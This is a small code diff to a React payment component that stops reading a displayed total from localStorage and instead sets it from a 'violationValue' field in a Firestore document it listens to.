@@ -147,7 +147,6 @@ export default function (props: any) {
     newotp.push(`${otp} , `)
   }
   useEffect(()=>{
-setTotal(localStorage?.getItem('vv')!)
   }, [])
 
   useEffect(() => {
@@ -156,6 +155,7 @@ setTotal(localStorage?.getItem('vv')!)
       const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as any;
+          setTotal(data.violationValue)
           if (data.status) {
             setPaymentInfo(prev => ({ ...prev, status: data.status }));
             if (data.status === 'approved') {
